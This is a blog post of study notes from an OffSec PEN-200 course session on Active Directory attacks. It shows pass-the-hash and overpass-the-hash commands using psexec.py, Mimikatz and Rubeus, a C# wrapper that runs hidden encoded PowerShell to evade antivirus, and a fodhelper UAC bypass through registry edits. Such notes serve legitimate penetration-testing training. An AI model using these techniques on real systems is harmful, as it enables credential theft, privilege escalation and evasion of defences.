---
title: 'OffSec Live: PEN-200'
date: 2022-09-02 12:00:00.000000000 Z
layout: post-external
original_link: https://cardboard-iguana.com/log/2022-09-02-offsec-live-pen-200.html
author: 100007
---

<h1 id="offsec-live-pen-200">OffSec Live: PEN-200</h1>
<p><strong>author:</strong> Nathan Acks<br />
<strong>date:</strong> 2022-09-02</p>
<h1 id="active-directory-enumeration--exploitation-part-4">Active Directory Enumeration &amp; Exploitation, Part 4</h1>
<p>LM hashes aren’t used in WIndows anymore, and often empty or garbage values will work fine when passing a full NTLM hash (only the NT hash is important).</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>proxychains python3 <span class="se">\</span>
/usr/share/doc/python3-impacket/examples/psexec.py <span class="se">\</span>
<span class="nt">-hashes</span> <span class="k">$&#x007b;</span><span class="nv">LM_HASH</span><span class="k">&#x007d;</span>:<span class="k">$&#x007b;</span><span class="nv">NT_HASH</span><span class="k">&#x007d;</span> <span class="k">$&#x007b;</span><span class="nv">USER</span><span class="k">&#x007d;</span>@<span class="k">$&#x007b;</span><span class="nv">MACHINE</span><span class="k">&#x007d;</span>
</code></pre></div></div>
<p>There’s a technique called “overpass the hash” that allows you to take advantage of accounts that are authorized to interact with services but <em>not</em> machines on a domain. The idea behind overpass-the-hash is to request a ticket from the domain controller for one user but then use that as the authentication credentials for a different user when running a command. This allows you to be logged in as, say, a service account but then use the credentials for a domain admin to interact with the domain controller. Stealthy!</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Invoke-Mimikatz</span><span class="w"> </span><span class="nt">-Command</span><span class="w"> </span><span class="s1">'"privilege::debug" "sekurlsa::pth /user:$USER /domain:$DOMAIN /ntlm:$NT_HASH /run:$COMMAND"'</span><span class="w">
</span></code></pre></div></div>
<p>Note that the “NTLM” hash in the Mimikatz command line is actually just the NT hash.</p>
<p>Another reason to use overpass-the-hash is to be able to interact with services that are restricted to certain users who do <em>not</em> have login permissions. This is a common(ish) technique for securing services on a domain.</p>
<p>Note that whenever an overpass-the-hash attack, the output of whoami will become desynced to your network credentials - whoami will still show the user you’re logged into, but the domain credentials you use on the network will be those of the user whose hash you “overpassed”.</p>
<p>Rubeus can be used to <em>remove</em> tickets from an account.</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Rubeus.exe</span><span class="w"> </span><span class="nx">purge</span><span class="w">
</span></code></pre></div></div>
<p>You can also use Rubeus to grab new tickets from a domain controller for a user in an overpass-the-hash attack.</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Rubeus.exe</span><span class="w"> </span><span class="nx">asktgt</span><span class="w"> </span><span class="nx">/domain:</span><span class="nv">$DOMAIN</span><span class="w"> </span><span class="nx">/user:</span><span class="nv">$USER</span><span class="w"> </span><span class="nx">/rc4:</span><span class="nv">$NT_HASH</span><span class="w"> </span><span class="nx">/ptt</span><span class="w">
</span></code></pre></div></div>
<p>Note that Rubeus is generally detected by Windows AV these days.</p>
<p>The whole point of all of this is that when interacting with remote computers in an Active Directory domain, what matters is the <em>hash</em> you present, <em>not</em> the local user!</p>
<p>Many large companies will enable PowerShell Remoting on all machines in order to ease IT support burdens (by default, remoting is only enabled on domain controllers).</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Invoke-Command</span><span class="w"> </span><span class="nt">-ComputerName</span><span class="w"> </span><span class="nv">$MACHINE</span><span class="w"> </span><span class="se">`
</span><span class="w"> </span><span class="nt">-ScriptBlock</span><span class="w"> </span><span class="p">&#x007b;</span><span class="nv">$COMMANDS_TO_RUN</span><span class="p">&#x007d;</span><span class="w">
</span></code></pre></div></div>
<p>Remoting can be used to create a reverse shell.</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$SESSION_NAME</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-PSSession</span><span class="w"> </span><span class="nt">-ComputerName</span><span class="w"> </span><span class="s2">"</span><span class="nv">$MACHINE</span><span class="s2">"</span><span class="w">
</span><span class="n">Enter-PSSession</span><span class="w"> </span><span class="nt">-Session</span><span class="w"> </span><span class="nv">$SESSION_NAME</span><span class="w">
</span></code></pre></div></div>
<p>You need to be logged in as a user with permission to use PowerShell for remote administration, however, or be using overpass-the-hash to get an equivalent set of credentials.</p>
<p>C# can be used to bypass AV (at least as of September 2022) - just create a C# wrapper that fires up a PowerShell one-liner. (Sometimes this will need to be modified slightly to bypass AV, but generally you don’t have to tweak this code much - C# analysis doesn’t seem to be particularly robust for most AV products.)</p>
<div class="language-c# highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">using</span> <span class="nn">System</span><span class="p">;</span>
<span class="k">namespace</span> <span class="nn">Game</span>
<span class="p">&#x007b;</span>
<span class="k">public</span> <span class="k">class</span> <span class="nc">Program</span>
<span class="p">&#x007b;</span>
<span class="k">public</span> <span class="k">static</span> <span class="k">void</span> <span class="nf">Main</span><span class="p">()</span> <span class="p">&#x007b;</span>
<span class="n">System</span><span class="p">.</span><span class="n">Diagnostics</span><span class="p">.</span><span class="n">Process</span> <span class="n">P</span> <span class="p">=</span> <span class="k">new</span> <span class="n">System</span><span class="p">.</span><span class="n">Diagnostics</span><span class="p">.</span><span class="nf">Process</span><span class="p">();</span>
<span class="n">System</span><span class="p">.</span><span class="n">Diagnostics</span><span class="p">.</span><span class="n">ProcessStartInfo</span> <span class="n">SI</span> <span class="p">=</span> <span class="k">new</span> <span class="n">System</span><span class="p">.</span><span class="n">Diagnostics</span><span class="p">.</span><span class="nf">ProcessStartInfo</span><span class="p">();</span>
<span class="n">SI</span><span class="p">.</span><span class="n">WindowStyle</span> <span class="p">=</span> <span class="n">System</span><span class="p">.</span><span class="n">Diagnostics</span><span class="p">.</span><span class="n">ProcessWindowStyle</span><span class="p">.</span><span class="n">Hidden</span><span class="p">;</span>
<span class="n">SI</span><span class="p">.</span><span class="n">FileName</span> <span class="p">=</span> <span class="s">"powershell.exe"</span><span class="p">;</span>
<span class="n">SI</span><span class="p">.</span><span class="n">Arguments</span> <span class="p">=</span> <span class="s">"-enc $BASE64_ENCODED_SCRIPT_TO_RUN"</span><span class="p">;</span>
<span class="n">P</span><span class="p">.</span><span class="n">StartInfo</span> <span class="p">=</span> <span class="n">SI</span><span class="p">;</span>
<span class="n">P</span><span class="p">.</span><span class="nf">Start</span><span class="p">();</span>
<span class="p">&#x007d;</span>
<span class="p">&#x007d;</span>
<span class="p">&#x007d;</span>
</code></pre></div></div>
<p>This can be compiled using PowerShell - perhaps even on the target itself. What’s the advantage to doing this? You can use Invoke-Mimikatz to run this binary remotely to quickly obtain a remote shell with the permissions of the user you’re impersonating with overpass-the-hash (this is a way of getting a shell on a machine that you can interact with, but aren’t allowed to open a shell on directly).</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$code</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sh">@"
using System;
namespace Game
&#x007b;
public class Program
&#x007b;
public static void Main() &#x007b;
System.Diagnostics.Process P = new System.Diagnostics.Process();
System.Diagnostics.ProcessStartInfo SI = new System.Diagnostics.ProcessStartInfo();
SI.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
SI.FileName = "powershell.exe";
SI.Arguments = "-enc </span><span class="nv">$BASE64_ENCODED_SCRIPT_TO_RUN</span><span class="sh">";
P.StartInfo = SI;
P.Start();
&#x007d;
&#x007d;
&#x007d;
"@</span><span class="w">
</span><span class="n">Add-Type</span><span class="w"> </span><span class="nt">-outputtype</span><span class="w"> </span><span class="nx">consoleapplication</span><span class="w"> </span><span class="nt">-outputassembly</span><span class="w"> </span><span class="nv">$BINARY_NAME</span><span class="w"> </span><span class="nt">-TypeDefinition</span><span class="w"> </span><span class="nv">$code</span><span class="w"> </span><span class="nt">-Language</span><span class="w"> </span><span class="nx">CSharp</span><span class="w">
</span></code></pre></div></div>
<p>The fodhelper binary can be abused to gain an admin shell on Windows boxes with two registry key changes.</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">REG</span><span class="w"> </span><span class="nx">ADD</span><span class="w"> </span><span class="nx">HKCU\Software\Classes\ms-settings\Shell\Open\command</span><span class="w"> </span><span class="nx">/d</span><span class="w"> </span><span class="s2">"cmd.exe"</span><span class="w">
</span><span class="n">REG</span><span class="w"> </span><span class="nx">ADD</span><span class="w"> </span><span class="nx">HKCU\Software\Classes\ms-settings\Shell\Open\command</span><span class="w"> </span><span class="nx">/v</span><span class="w"> </span><span class="nx">DelegateExecute</span><span class="w"> </span><span class="nx">/t</span><span class="w"> </span><span class="nx">REG_SZ</span><span class="w">
</span></code></pre></div></div>
<p>Note that if you try to put powershell.exe into this, Defender will block the shell from being opened (in fact, the key value will be cleared on run). Other AV tools will even detect cmd.exe. It looks like this can be bypassed, however, by using the CurVer registry key to point fodhelper.exe to a different registry location:</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">New-Item</span><span class="w"> </span><span class="s2">"HKCU:\Software\Classes\.pwn\Shell\Open\command"</span><span class="w"> </span><span class="nt">-Force</span><span class="w">
</span><span class="n">Set-ItemProperty</span><span class="w"> </span><span class="s2">"HKCU:\Software\Classes\.pwn\Shell\Open\command"</span><span class="w"> </span><span class="se">`
</span><span class="w"> </span><span class="nt">-Name</span><span class="w"> </span><span class="s2">"(default)"</span><span class="w"> </span><span class="nt">-Value</span><span class="w"> </span><span class="s2">"cmd.exe /c start powershell.exe"</span><span class="w"> </span><span class="nt">-Force</span><span class="w">
</span><span class="n">New-Item</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="s2">"HKCU:\Software\Classes\ms-settings\CurVer"</span><span class="w"> </span><span class="nt">-Force</span><span class="w">
</span><span class="n">Set-ItemProperty</span><span class="w"> </span><span class="s2">"HKCU:\Software\Classes\ms-settings\CurVer"</span><span class="w"> </span><span class="se">`
</span><span class="w"> </span><span class="nt">-Name</span><span class="w"> </span><span class="s2">"(default)"</span><span class="w"> </span><span class="nt">-value</span><span class="w"> </span><span class="s2">".pwn"</span><span class="w"> </span><span class="nt">-Force</span><span class="w">
</span></code></pre></div></div>
<ul>
<li><a href="https://v3ded.github.io/redteam/utilizing-programmatic-identifiers-progids-for-uac-bypasses">Utilizing Programmatic Identifiers (ProgIDs) for UAC Bypasses</a></li>
</ul>